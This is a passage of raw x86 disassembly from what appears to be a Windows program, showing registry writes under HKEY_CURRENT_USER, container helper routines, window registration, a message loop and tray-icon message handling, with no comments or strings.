  40bc31:	bf 90 df 40 00       	mov    $0x40df90,%edi
  40bc36:	68 80 df 40 00       	push   $0x40df80
  40bc3b:	be 01 00 00 80       	mov    $0x80000001,%esi
  40bc40:	57                   	push   %edi
  40bc41:	56                   	push   %esi
  40bc42:	e8 46 a3 ff ff       	call   0x405f8d
  40bc47:	83 c4 20             	add    $0x20,%esp
  40bc4a:	8d 45 fd             	lea    -0x3(%ebp),%eax
  40bc4d:	6a 01                	push   $0x1
  40bc4f:	83 ec 10             	sub    $0x10,%esp
  40bc52:	8b cc                	mov    %esp,%ecx
  40bc54:	eb 74                	jmp    0x40bcca
  40bc56:	6a 01                	push   $0x1
  40bc58:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40bc5b:	83 ec 10             	sub    $0x10,%esp
  40bc5e:	8b cc                	mov    %esp,%ecx
  40bc60:	50                   	push   %eax
  40bc61:	68 7c df 40 00       	push   $0x40df7c
  40bc66:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40bc6c:	bf 90 df 40 00       	mov    $0x40df90,%edi
  40bc71:	68 80 df 40 00       	push   $0x40df80
  40bc76:	be 01 00 00 80       	mov    $0x80000001,%esi
  40bc7b:	57                   	push   %edi
  40bc7c:	56                   	push   %esi
  40bc7d:	e8 0b a3 ff ff       	call   0x405f8d
  40bc82:	83 c4 20             	add    $0x20,%esp
  40bc85:	8d 45 fb             	lea    -0x5(%ebp),%eax
  40bc88:	6a 01                	push   $0x1
  40bc8a:	83 ec 10             	sub    $0x10,%esp
  40bc8d:	8b cc                	mov    %esp,%ecx
  40bc8f:	eb 39                	jmp    0x40bcca
  40bc91:	6a 01                	push   $0x1
  40bc93:	8d 45 fa             	lea    -0x6(%ebp),%eax
  40bc96:	83 ec 10             	sub    $0x10,%esp
  40bc99:	8b cc                	mov    %esp,%ecx
  40bc9b:	50                   	push   %eax
  40bc9c:	68 30 dc 40 00       	push   $0x40dc30
  40bca1:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40bca7:	bf 90 df 40 00       	mov    $0x40df90,%edi
  40bcac:	68 80 df 40 00       	push   $0x40df80
  40bcb1:	be 01 00 00 80       	mov    $0x80000001,%esi
  40bcb6:	57                   	push   %edi
  40bcb7:	56                   	push   %esi
  40bcb8:	e8 d0 a2 ff ff       	call   0x405f8d
  40bcbd:	83 c4 20             	add    $0x20,%esp
  40bcc0:	8d 45 f9             	lea    -0x7(%ebp),%eax
  40bcc3:	6a 01                	push   $0x1
  40bcc5:	83 ec 10             	sub    $0x10,%esp
  40bcc8:	8b cc                	mov    %esp,%ecx
  40bcca:	50                   	push   %eax
  40bccb:	68 c4 dc 40 00       	push   $0x40dcc4
  40bcd0:	eb 3c                	jmp    0x40bd0e
  40bcd2:	6a 01                	push   $0x1
  40bcd4:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40bcd7:	83 ec 10             	sub    $0x10,%esp
  40bcda:	bb c4 dc 40 00       	mov    $0x40dcc4,%ebx
  40bcdf:	8b cc                	mov    %esp,%ecx
  40bce1:	50                   	push   %eax
  40bce2:	53                   	push   %ebx
  40bce3:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40bce9:	bf 90 df 40 00       	mov    $0x40df90,%edi
  40bcee:	68 80 df 40 00       	push   $0x40df80
  40bcf3:	be 01 00 00 80       	mov    $0x80000001,%esi
  40bcf8:	57                   	push   %edi
  40bcf9:	56                   	push   %esi
  40bcfa:	e8 8e a2 ff ff       	call   0x405f8d
  40bcff:	83 c4 20             	add    $0x20,%esp
  40bd02:	8d 45 f7             	lea    -0x9(%ebp),%eax
  40bd05:	6a 01                	push   $0x1
  40bd07:	83 ec 10             	sub    $0x10,%esp
  40bd0a:	8b cc                	mov    %esp,%ecx
  40bd0c:	50                   	push   %eax
  40bd0d:	53                   	push   %ebx
  40bd0e:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40bd14:	68 6c df 40 00       	push   $0x40df6c
  40bd19:	57                   	push   %edi
  40bd1a:	56                   	push   %esi
  40bd1b:	e8 6d a2 ff ff       	call   0x405f8d
  40bd20:	83 c4 20             	add    $0x20,%esp
  40bd23:	6a 03                	push   $0x3
  40bd25:	ff 75 0c             	push   0xc(%ebp)
  40bd28:	6a 00                	push   $0x0
  40bd2a:	6a 14                	push   $0x14
  40bd2c:	ff 15 c4 d3 40 00    	call   *0x40d3c4
  40bd32:	5f                   	pop    %edi
  40bd33:	5e                   	pop    %esi
  40bd34:	5b                   	pop    %ebx
  40bd35:	c9                   	leave
  40bd36:	c3                   	ret
  40bd37:	55                   	push   %ebp
  40bd38:	8b ec                	mov    %esp,%ebp
  40bd3a:	56                   	push   %esi
  40bd3b:	57                   	push   %edi
  40bd3c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40bd3f:	8b f1                	mov    %ecx,%esi
  40bd41:	6a 00                	push   $0x0
  40bd43:	8b cf                	mov    %edi,%ecx
  40bd45:	8a 07                	mov    (%edi),%al
  40bd47:	88 06                	mov    %al,(%esi)
  40bd49:	e8 41 5e ff ff       	call   0x401b8f
  40bd4e:	50                   	push   %eax
  40bd4f:	8b ce                	mov    %esi,%ecx
  40bd51:	e8 ce 9c ff ff       	call   0x405a24
  40bd56:	50                   	push   %eax
  40bd57:	8b cf                	mov    %edi,%ecx
  40bd59:	89 46 04             	mov    %eax,0x4(%esi)
  40bd5c:	e8 39 00 00 00       	call   0x40bd9a
  40bd61:	50                   	push   %eax
  40bd62:	8b cf                	mov    %edi,%ecx
  40bd64:	e8 22 5e ff ff       	call   0x401b8b
  40bd69:	50                   	push   %eax
  40bd6a:	8b ce                	mov    %esi,%ecx
  40bd6c:	e8 87 9c ff ff       	call   0x4059f8
  40bd71:	89 46 08             	mov    %eax,0x8(%esi)
  40bd74:	89 46 0c             	mov    %eax,0xc(%esi)
  40bd77:	8b c6                	mov    %esi,%eax
  40bd79:	5f                   	pop    %edi
  40bd7a:	5e                   	pop    %esi
  40bd7b:	5d                   	pop    %ebp
  40bd7c:	c2 04 00             	ret    $0x4
  40bd7f:	55                   	push   %ebp
  40bd80:	8b ec                	mov    %esp,%ebp
  40bd82:	56                   	push   %esi
  40bd83:	8b f1                	mov    %ecx,%esi
  40bd85:	ff 75 08             	push   0x8(%ebp)
  40bd88:	e8 0d 00 00 00       	call   0x40bd9a
  40bd8d:	50                   	push   %eax
  40bd8e:	8b ce                	mov    %esi,%ecx
  40bd90:	e8 09 00 00 00       	call   0x40bd9e
  40bd95:	5e                   	pop    %esi
  40bd96:	5d                   	pop    %ebp
  40bd97:	c2 04 00             	ret    $0x4
  40bd9a:	8b 41 08             	mov    0x8(%ecx),%eax
  40bd9d:	c3                   	ret
  40bd9e:	55                   	push   %ebp
  40bd9f:	8b ec                	mov    %esp,%ebp
  40bda1:	56                   	push   %esi
  40bda2:	57                   	push   %edi
  40bda3:	8b f9                	mov    %ecx,%edi
  40bda5:	e8 e1 5d ff ff       	call   0x401b8b
  40bdaa:	ff 75 0c             	push   0xc(%ebp)
  40bdad:	8b 75 08             	mov    0x8(%ebp),%esi
  40bdb0:	2b f0                	sub    %eax,%esi
  40bdb2:	8b cf                	mov    %edi,%ecx
  40bdb4:	6a 01                	push   $0x1
  40bdb6:	ff 75 08             	push   0x8(%ebp)
  40bdb9:	c1 fe 04             	sar    $0x4,%esi
  40bdbc:	e8 12 00 00 00       	call   0x40bdd3
  40bdc1:	8b cf                	mov    %edi,%ecx
  40bdc3:	e8 c3 5d ff ff       	call   0x401b8b
  40bdc8:	c1 e6 04             	shl    $0x4,%esi
  40bdcb:	03 c6                	add    %esi,%eax
  40bdcd:	5f                   	pop    %edi
  40bdce:	5e                   	pop    %esi
  40bdcf:	5d                   	pop    %ebp
  40bdd0:	c2 08 00             	ret    $0x8
  40bdd3:	55                   	push   %ebp
  40bdd4:	8b ec                	mov    %esp,%ebp
  40bdd6:	51                   	push   %ecx
  40bdd7:	53                   	push   %ebx
  40bdd8:	56                   	push   %esi
  40bdd9:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40bddc:	8b f1                	mov    %ecx,%esi
  40bdde:	57                   	push   %edi
  40bddf:	8b 46 08             	mov    0x8(%esi),%eax
  40bde2:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40bde5:	2b c8                	sub    %eax,%ecx
  40bde7:	c1 f9 04             	sar    $0x4,%ecx
  40bdea:	3b cb                	cmp    %ebx,%ecx
  40bdec:	0f 83 ae 00 00 00    	jae    0x40bea0
  40bdf2:	8b ce                	mov    %esi,%ecx
  40bdf4:	e8 96 5d ff ff       	call   0x401b8f
  40bdf9:	3b d8                	cmp    %eax,%ebx
  40bdfb:	73 0c                	jae    0x40be09
  40bdfd:	8b ce                	mov    %esi,%ecx
  40bdff:	e8 8b 5d ff ff       	call   0x401b8f
  40be04:	89 45 0c             	mov    %eax,0xc(%ebp)
  40be07:	eb 03                	jmp    0x40be0c
  40be09:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  40be0c:	8b ce                	mov    %esi,%ecx
  40be0e:	e8 7c 5d ff ff       	call   0x401b8f
  40be13:	8b f8                	mov    %eax,%edi
  40be15:	6a 00                	push   $0x0
  40be17:	03 7d 0c             	add    0xc(%ebp),%edi
  40be1a:	8b ce                	mov    %esi,%ecx
  40be1c:	57                   	push   %edi
  40be1d:	e8 02 9c ff ff       	call   0x405a24
  40be22:	50                   	push   %eax
  40be23:	8b ce                	mov    %esi,%ecx
  40be25:	ff 75 08             	push   0x8(%ebp)
  40be28:	89 45 0c             	mov    %eax,0xc(%ebp)
  40be2b:	ff 76 04             	push   0x4(%esi)
  40be2e:	e8 c5 9b ff ff       	call   0x4059f8
  40be33:	ff 75 10             	push   0x10(%ebp)
  40be36:	8b ce                	mov    %esi,%ecx
  40be38:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40be3b:	53                   	push   %ebx
  40be3c:	50                   	push   %eax
  40be3d:	e8 ea 00 00 00       	call   0x40bf2c
  40be42:	8b c3                	mov    %ebx,%eax
  40be44:	8b ce                	mov    %esi,%ecx
  40be46:	c1 e0 04             	shl    $0x4,%eax
  40be49:	03 45 fc             	add    -0x4(%ebp),%eax
  40be4c:	50                   	push   %eax
  40be4d:	ff 76 08             	push   0x8(%esi)
  40be50:	ff 75 08             	push   0x8(%ebp)
  40be53:	e8 a0 9b ff ff       	call   0x4059f8
  40be58:	ff 76 08             	push   0x8(%esi)
  40be5b:	8b ce                	mov    %esi,%ecx
  40be5d:	ff 76 04             	push   0x4(%esi)
  40be60:	e8 3d 5d ff ff       	call   0x401ba2
  40be65:	8b 46 04             	mov    0x4(%esi),%eax
  40be68:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40be6b:	2b c8                	sub    %eax,%ecx
  40be6d:	c1 f9 04             	sar    $0x4,%ecx
  40be70:	51                   	push   %ecx
  40be71:	50                   	push   %eax
  40be72:	8b ce                	mov    %esi,%ecx
  40be74:	e8 09 7f ff ff       	call   0x403d82
  40be79:	c1 e7 04             	shl    $0x4,%edi
  40be7c:	03 7d 0c             	add    0xc(%ebp),%edi
  40be7f:	8b ce                	mov    %esi,%ecx
  40be81:	89 7e 0c             	mov    %edi,0xc(%esi)
  40be84:	e8 06 5d ff ff       	call   0x401b8f
  40be89:	8b c8                	mov    %eax,%ecx
  40be8b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40be8e:	03 cb                	add    %ebx,%ecx
  40be90:	89 46 04             	mov    %eax,0x4(%esi)
  40be93:	c1 e1 04             	shl    $0x4,%ecx
  40be96:	03 c8                	add    %eax,%ecx
  40be98:	89 4e 08             	mov    %ecx,0x8(%esi)
  40be9b:	e9 85 00 00 00       	jmp    0x40bf25
  40bea0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40bea3:	8b d0                	mov    %eax,%edx
  40bea5:	2b d1                	sub    %ecx,%edx
  40bea7:	c1 fa 04             	sar    $0x4,%edx
  40beaa:	3b d3                	cmp    %ebx,%edx
  40beac:	73 41                	jae    0x40beef
  40beae:	8b fb                	mov    %ebx,%edi
  40beb0:	c1 e7 04             	shl    $0x4,%edi
  40beb3:	8d 14 0f             	lea    (%edi,%ecx,1),%edx
  40beb6:	52                   	push   %edx
  40beb7:	50                   	push   %eax
  40beb8:	51                   	push   %ecx
  40beb9:	8b ce                	mov    %esi,%ecx
  40bebb:	e8 38 9b ff ff       	call   0x4059f8
  40bec0:	8b 46 08             	mov    0x8(%esi),%eax
  40bec3:	ff 75 10             	push   0x10(%ebp)
  40bec6:	8b c8                	mov    %eax,%ecx
  40bec8:	2b 4d 08             	sub    0x8(%ebp),%ecx
  40becb:	c1 f9 04             	sar    $0x4,%ecx
  40bece:	2b d9                	sub    %ecx,%ebx
  40bed0:	8b ce                	mov    %esi,%ecx
  40bed2:	53                   	push   %ebx
  40bed3:	50                   	push   %eax
  40bed4:	e8 53 00 00 00       	call   0x40bf2c
  40bed9:	ff 75 10             	push   0x10(%ebp)
  40bedc:	ff 76 08             	push   0x8(%esi)
  40bedf:	ff 75 08             	push   0x8(%ebp)
  40bee2:	e8 ac 00 00 00       	call   0x40bf93
  40bee7:	83 c4 0c             	add    $0xc,%esp
  40beea:	01 7e 08             	add    %edi,0x8(%esi)
  40beed:	eb 36                	jmp    0x40bf25
  40beef:	85 db                	test   %ebx,%ebx
  40bef1:	76 32                	jbe    0x40bf25
  40bef3:	c1 e3 04             	shl    $0x4,%ebx
  40bef6:	50                   	push   %eax
  40bef7:	50                   	push   %eax
  40bef8:	2b c3                	sub    %ebx,%eax
  40befa:	8b ce                	mov    %esi,%ecx
  40befc:	50                   	push   %eax
  40befd:	e8 f6 9a ff ff       	call   0x4059f8
  40bf02:	8b 46 08             	mov    0x8(%esi),%eax
  40bf05:	8b 7d 08             	mov    0x8(%ebp),%edi
  40bf08:	50                   	push   %eax
  40bf09:	2b c3                	sub    %ebx,%eax
  40bf0b:	50                   	push   %eax
  40bf0c:	57                   	push   %edi
  40bf0d:	e8 a0 00 00 00       	call   0x40bfb2
  40bf12:	ff 75 10             	push   0x10(%ebp)
  40bf15:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  40bf18:	50                   	push   %eax
  40bf19:	57                   	push   %edi
  40bf1a:	e8 74 00 00 00       	call   0x40bf93
  40bf1f:	83 c4 18             	add    $0x18,%esp
  40bf22:	01 5e 08             	add    %ebx,0x8(%esi)
  40bf25:	5f                   	pop    %edi
  40bf26:	5e                   	pop    %esi
  40bf27:	5b                   	pop    %ebx
  40bf28:	c9                   	leave
  40bf29:	c2 0c 00             	ret    $0xc
  40bf2c:	55                   	push   %ebp
  40bf2d:	8b ec                	mov    %esp,%ebp
  40bf2f:	56                   	push   %esi
  40bf30:	8b 75 0c             	mov    0xc(%ebp),%esi
  40bf33:	57                   	push   %edi
  40bf34:	8b f9                	mov    %ecx,%edi
  40bf36:	85 f6                	test   %esi,%esi
  40bf38:	76 14                	jbe    0x40bf4e
  40bf3a:	ff 75 10             	push   0x10(%ebp)
  40bf3d:	8b cf                	mov    %edi,%ecx
  40bf3f:	ff 75 08             	push   0x8(%ebp)
  40bf42:	e8 f0 9a ff ff       	call   0x405a37
  40bf47:	83 45 08 10          	addl   $0x10,0x8(%ebp)
  40bf4b:	4e                   	dec    %esi
  40bf4c:	75 ec                	jne    0x40bf3a
  40bf4e:	5f                   	pop    %edi
  40bf4f:	5e                   	pop    %esi
  40bf50:	5d                   	pop    %ebp
  40bf51:	c2 0c 00             	ret    $0xc
  40bf54:	55                   	push   %ebp
  40bf55:	8b ec                	mov    %esp,%ebp
  40bf57:	8b 45 08             	mov    0x8(%ebp),%eax
  40bf5a:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40bf5d:	74 11                	je     0x40bf70
  40bf5f:	66 0f be 08          	movsbw (%eax),%cx
  40bf63:	8b 55 10             	mov    0x10(%ebp),%edx
  40bf66:	83 45 10 02          	addl   $0x2,0x10(%ebp)
  40bf6a:	40                   	inc    %eax
  40bf6b:	66 89 0a             	mov    %cx,(%edx)
  40bf6e:	eb ea                	jmp    0x40bf5a
  40bf70:	8b 45 10             	mov    0x10(%ebp),%eax
  40bf73:	5d                   	pop    %ebp
  40bf74:	c3                   	ret
  40bf75:	55                   	push   %ebp
  40bf76:	8b ec                	mov    %esp,%ebp
  40bf78:	8b 45 08             	mov    0x8(%ebp),%eax
  40bf7b:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40bf7e:	74 0e                	je     0x40bf8e
  40bf80:	8b 55 10             	mov    0x10(%ebp),%edx
  40bf83:	8a 08                	mov    (%eax),%cl
  40bf85:	ff 45 10             	incl   0x10(%ebp)
  40bf88:	40                   	inc    %eax
  40bf89:	88 0a                	mov    %cl,(%edx)
  40bf8b:	40                   	inc    %eax
  40bf8c:	eb ed                	jmp    0x40bf7b
  40bf8e:	8b 45 10             	mov    0x10(%ebp),%eax
  40bf91:	5d                   	pop    %ebp
  40bf92:	c3                   	ret
  40bf93:	55                   	push   %ebp
  40bf94:	8b ec                	mov    %esp,%ebp
  40bf96:	56                   	push   %esi
  40bf97:	8b 75 08             	mov    0x8(%ebp),%esi
  40bf9a:	3b 75 0c             	cmp    0xc(%ebp),%esi
  40bf9d:	74 10                	je     0x40bfaf
  40bf9f:	ff 75 10             	push   0x10(%ebp)
  40bfa2:	8b ce                	mov    %esi,%ecx
  40bfa4:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  40bfaa:	83 c6 10             	add    $0x10,%esi
  40bfad:	eb eb                	jmp    0x40bf9a
  40bfaf:	5e                   	pop    %esi
  40bfb0:	5d                   	pop    %ebp
  40bfb1:	c3                   	ret
  40bfb2:	55                   	push   %ebp
  40bfb3:	8b ec                	mov    %esp,%ebp
  40bfb5:	56                   	push   %esi
  40bfb6:	8b 75 0c             	mov    0xc(%ebp),%esi
  40bfb9:	39 75 08             	cmp    %esi,0x8(%ebp)
  40bfbc:	74 16                	je     0x40bfd4
  40bfbe:	83 6d 10 10          	subl   $0x10,0x10(%ebp)
  40bfc2:	83 ee 10             	sub    $0x10,%esi
  40bfc5:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40bfc8:	56                   	push   %esi
  40bfc9:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  40bfcf:	3b 75 08             	cmp    0x8(%ebp),%esi
  40bfd2:	75 ea                	jne    0x40bfbe
  40bfd4:	8b 45 10             	mov    0x10(%ebp),%eax
  40bfd7:	5e                   	pop    %esi
  40bfd8:	5d                   	pop    %ebp
  40bfd9:	c3                   	ret
  40bfda:	e8 05 00 00 00       	call   0x40bfe4
  40bfdf:	e9 0b 00 00 00       	jmp    0x40bfef
  40bfe4:	b9 75 1d 41 00       	mov    $0x411d75,%ecx
  40bfe9:	ff 25 d8 d1 40 00    	jmp    *0x40d1d8
  40bfef:	68 fb bf 40 00       	push   $0x40bffb
  40bff4:	e8 bf 03 00 00       	call   0x40c3b8
  40bff9:	59                   	pop    %ecx
  40bffa:	c3                   	ret
  40bffb:	b9 75 1d 41 00       	mov    $0x411d75,%ecx
  40c000:	ff 25 dc d1 40 00    	jmp    *0x40d1dc
  40c006:	e8 05 00 00 00       	call   0x40c010
  40c00b:	e9 0b 00 00 00       	jmp    0x40c01b
  40c010:	b9 74 1d 41 00       	mov    $0x411d74,%ecx
  40c015:	ff 25 e0 d1 40 00    	jmp    *0x40d1e0
  40c01b:	68 27 c0 40 00       	push   $0x40c027
  40c020:	e8 93 03 00 00       	call   0x40c3b8
  40c025:	59                   	pop    %ecx
  40c026:	c3                   	ret
  40c027:	b9 74 1d 41 00       	mov    $0x411d74,%ecx
  40c02c:	ff 25 e4 d1 40 00    	jmp    *0x40d1e4
  40c032:	e9 00 00 00 00       	jmp    0x40c037
  40c037:	68 b0 df 40 00       	push   $0x40dfb0
  40c03c:	68 78 db 40 00       	push   $0x40db78
  40c041:	ff 15 24 d1 40 00    	call   *0x40d124
  40c047:	50                   	push   %eax
  40c048:	ff 15 28 d1 40 00    	call   *0x40d128
  40c04e:	a3 78 1d 41 00       	mov    %eax,0x411d78
  40c053:	c3                   	ret
  40c054:	55                   	push   %ebp
  40c055:	8b ec                	mov    %esp,%ebp
  40c057:	81 ec 20 01 00 00    	sub    $0x120,%esp
  40c05d:	56                   	push   %esi
  40c05e:	57                   	push   %edi
  40c05f:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  40c065:	68 04 01 00 00       	push   $0x104
  40c06a:	33 f6                	xor    %esi,%esi
  40c06c:	50                   	push   %eax
  40c06d:	56                   	push   %esi
  40c06e:	ff 15 f4 d0 40 00    	call   *0x40d0f4
  40c074:	e8 94 00 00 00       	call   0x40c10d
  40c079:	a3 84 1d 41 00       	mov    %eax,0x411d84
  40c07e:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  40c084:	56                   	push   %esi
  40c085:	50                   	push   %eax
  40c086:	56                   	push   %esi
  40c087:	c7 05 80 1d 41 00 58 	movl   $0x58,0x411d80
  40c08e:	00 00 00 
  40c091:	c7 05 88 1d 41 00 01 	movl   $0x1,0x411d88
  40c098:	00 00 00 
  40c09b:	c7 05 90 1d 41 00 01 	movl   $0x401,0x411d90
  40c0a2:	04 00 00 
  40c0a5:	ff 15 90 d3 40 00    	call   *0x40d390
  40c0ab:	6a 40                	push   $0x40
  40c0ad:	a3 94 1d 41 00       	mov    %eax,0x411d94
  40c0b2:	ff 35 30 11 41 00    	push   0x411130
  40c0b8:	68 98 1d 41 00       	push   $0x411d98
  40c0bd:	ff 15 f0 d0 40 00    	call   *0x40d0f0
  40c0c3:	68 80 1d 41 00       	push   $0x411d80
  40c0c8:	56                   	push   %esi
  40c0c9:	c7 05 8c 1d 41 00 07 	movl   $0x7,0x411d8c
  40c0d0:	00 00 00 
  40c0d3:	ff 15 94 d3 40 00    	call   *0x40d394
  40c0d9:	8b 3d 20 d4 40 00    	mov    0x40d420,%edi
  40c0df:	56                   	push   %esi
  40c0e0:	56                   	push   %esi
  40c0e1:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40c0e4:	56                   	push   %esi
  40c0e5:	50                   	push   %eax
  40c0e6:	ff d7                	call   *%edi
  40c0e8:	85 c0                	test   %eax,%eax
  40c0ea:	74 1d                	je     0x40c109
  40c0ec:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40c0ef:	50                   	push   %eax
  40c0f0:	ff 15 10 d4 40 00    	call   *0x40d410
  40c0f6:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40c0f9:	50                   	push   %eax
  40c0fa:	ff 15 1c d4 40 00    	call   *0x40d41c
  40c100:	56                   	push   %esi
  40c101:	56                   	push   %esi
  40c102:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40c105:	56                   	push   %esi
  40c106:	50                   	push   %eax
  40c107:	eb dd                	jmp    0x40c0e6
  40c109:	5f                   	pop    %edi
  40c10a:	5e                   	pop    %esi
  40c10b:	c9                   	leave
  40c10c:	c3                   	ret
  40c10d:	55                   	push   %ebp
  40c10e:	8b ec                	mov    %esp,%ebp
  40c110:	83 ec 40             	sub    $0x40,%esp
  40c113:	56                   	push   %esi
  40c114:	57                   	push   %edi
  40c115:	6a 0b                	push   $0xb
  40c117:	33 c0                	xor    %eax,%eax
  40c119:	59                   	pop    %ecx
  40c11a:	8d 7d c4             	lea    -0x3c(%ebp),%edi
  40c11d:	f3 ab                	rep stos %eax,%es:(%edi)
  40c11f:	be c4 df 40 00       	mov    $0x40dfc4,%esi
  40c124:	8d 7d f0             	lea    -0x10(%ebp),%edi
  40c127:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c128:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c129:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c12a:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  40c12c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40c12f:	c7 45 c0 30 00 00 00 	movl   $0x30,-0x40(%ebp)
  40c136:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40c137:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40c13a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40c13d:	33 f6                	xor    %esi,%esi
  40c13f:	50                   	push   %eax
  40c140:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  40c143:	c7 45 c8 84 c1 40 00 	movl   $0x40c184,-0x38(%ebp)
  40c14a:	89 75 cc             	mov    %esi,-0x34(%ebp)
  40c14d:	89 75 d0             	mov    %esi,-0x30(%ebp)
  40c150:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40c153:	ff 15 bc d3 40 00    	call   *0x40d3bc
  40c159:	66 85 c0             	test   %ax,%ax
  40c15c:	74 20                	je     0x40c17e
  40c15e:	56                   	push   %esi
  40c15f:	56                   	push   %esi
  40c160:	56                   	push   %esi
  40c161:	6a fd                	push   $0xfffffffd
  40c163:	56                   	push   %esi
  40c164:	56                   	push   %esi
  40c165:	56                   	push   %esi
  40c166:	56                   	push   %esi
  40c167:	56                   	push   %esi
  40c168:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40c16b:	56                   	push   %esi
  40c16c:	50                   	push   %eax
  40c16d:	56                   	push   %esi
  40c16e:	ff 15 c0 d3 40 00    	call   *0x40d3c0
  40c174:	3b c6                	cmp    %esi,%eax
  40c176:	75 08                	jne    0x40c180
  40c178:	ff 15 14 d1 40 00    	call   *0x40d114
  40c17e:	33 c0                	xor    %eax,%eax
  40c180:	5f                   	pop    %edi
  40c181:	5e                   	pop    %esi
  40c182:	c9                   	leave
  40c183:	c3                   	ret
  40c184:	55                   	push   %ebp
  40c185:	8b ec                	mov    %esp,%ebp
  40c187:	51                   	push   %ecx
  40c188:	51                   	push   %ecx
  40c189:	8b 45 0c             	mov    0xc(%ebp),%eax
  40c18c:	48                   	dec    %eax
  40c18d:	0f 84 ce 00 00 00    	je     0x40c261
  40c193:	2d 10 01 00 00       	sub    $0x110,%eax
  40c198:	0f 84 a6 00 00 00    	je     0x40c244
  40c19e:	2d f0 02 00 00       	sub    $0x2f0,%eax
  40c1a3:	74 17                	je     0x40c1bc
  40c1a5:	ff 75 14             	push   0x14(%ebp)
  40c1a8:	ff 75 10             	push   0x10(%ebp)
  40c1ab:	ff 75 0c             	push   0xc(%ebp)
  40c1ae:	ff 75 08             	push   0x8(%ebp)
  40c1b1:	ff 15 18 d4 40 00    	call   *0x40d418
  40c1b7:	e9 c2 00 00 00       	jmp    0x40c27e
  40c1bc:	8b 45 14             	mov    0x14(%ebp),%eax
  40c1bf:	2d 01 02 00 00       	sub    $0x201,%eax
  40c1c4:	74 42                	je     0x40c208
  40c1c6:	83 e8 03             	sub    $0x3,%eax
  40c1c9:	74 0d                	je     0x40c1d8
  40c1cb:	ff 75 14             	push   0x14(%ebp)
  40c1ce:	ff 75 10             	push   0x10(%ebp)
  40c1d1:	68 01 04 00 00       	push   $0x401
  40c1d6:	eb d6                	jmp    0x40c1ae
  40c1d8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40c1db:	50                   	push   %eax
  40c1dc:	ff 15 dc d3 40 00    	call   *0x40d3dc
  40c1e2:	ff 75 08             	push   0x8(%ebp)
  40c1e5:	ff 15 ac d3 40 00    	call   *0x40d3ac
  40c1eb:	6a 00                	push   $0x0
  40c1ed:	ff 75 08             	push   0x8(%ebp)
  40c1f0:	6a 00                	push   $0x0
  40c1f2:	ff 75 fc             	push   -0x4(%ebp)
  40c1f5:	ff 75 f8             	push   -0x8(%ebp)
  40c1f8:	6a 00                	push   $0x0
  40c1fa:	ff 35 70 1d 41 00    	push   0x411d70
  40c200:	ff 15 b0 d3 40 00    	call   *0x40d3b0
  40c206:	eb 74                	jmp    0x40c27c
  40c208:	ff 35 7c 1d 41 00    	push   0x411d7c
  40c20e:	ff 15 e0 d3 40 00    	call   *0x40d3e0
  40c214:	85 c0                	test   %eax,%eax
  40c216:	74 10                	je     0x40c228
  40c218:	6a 00                	push   $0x0
  40c21a:	ff 35 7c 1d 41 00    	push   0x411d7c
  40c220:	ff 15 e8 d3 40 00    	call   *0x40d3e8
  40c226:	eb 54                	jmp    0x40c27c
  40c228:	6a 09                	push   $0x9
  40c22a:	ff 35 7c 1d 41 00    	push   0x411d7c
  40c230:	ff 15 e8 d3 40 00    	call   *0x40d3e8
  40c236:	ff 35 7c 1d 41 00    	push   0x411d7c
  40c23c:	ff 15 ac d3 40 00    	call   *0x40d3ac
  40c242:	eb 38                	jmp    0x40c27c
  40c244:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40c248:	75 32                	jne    0x40c27c
  40c24a:	68 80 1d 41 00       	push   $0x411d80
  40c24f:	6a 02                	push   $0x2
  40c251:	ff 15 94 d3 40 00    	call   *0x40d394
  40c257:	6a 00                	push   $0x0
  40c259:	ff 15 f8 d0 40 00    	call   *0x40d0f8
  40c25f:	eb 1b                	jmp    0x40c27c
  40c261:	ff 15 b4 d3 40 00    	call   *0x40d3b4
  40c267:	68 d4 df 40 00       	push   $0x40dfd4
  40c26c:	6a 00                	push   $0x0
  40c26e:	6a 00                	push   $0x0
  40c270:	50                   	push   %eax
  40c271:	a3 70 1d 41 00       	mov    %eax,0x411d70
  40c276:	ff 15 b8 d3 40 00    	call   *0x40d3b8
  40c27c:	33 c0                	xor    %eax,%eax
  40c27e:	c9                   	leave
  40c27f:	c2 10 00             	ret    $0x10
  40c282:	55                   	push   %ebp
  40c283:	8b ec                	mov    %esp,%ebp
  40c285:	81 ec e8 03 00 00    	sub    $0x3e8,%esp
  40c28b:	53                   	push   %ebx
  40c28c:	56                   	push   %esi
  40c28d:	57                   	push   %edi
  40c28e:	ff 15 fc d0 40 00    	call   *0x40d0fc
  40c294:	ff 15 78 1d 41 00    	call   *0x411d78
